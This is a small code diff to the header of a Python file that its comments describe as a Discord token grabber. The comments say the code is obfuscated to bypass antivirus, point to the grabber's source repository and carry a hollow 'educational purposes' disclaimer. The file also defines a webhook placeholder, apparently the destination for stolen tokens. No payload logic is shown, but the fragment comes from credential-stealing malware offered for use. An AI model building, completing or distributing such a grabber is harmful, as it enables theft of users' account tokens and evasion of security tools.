@@ -1,6 +1,7 @@
 # Disclaimer: This is only for entertainment and educational purposes.  
 # I'm not responsible for what you do with it or any consequences.  
-# Obfuscated to bypass antivirus, you can find source: https://github.com/vn4thyt/vnsyt/blob/main/Stuff/Discord%20Token%20Grabber/ignore/src.py?raw=true
+# Obfuscated to bypass antivirus
+# You can find source: https://github.com/vn4thyt/vnsyt/blob/main/Stuff/Discord%20Token%20Grabber/ignore/src.py?raw=true
 # Made by Vexi :3
 
 webhook = "{placeholder_webhook}" # type: ignore
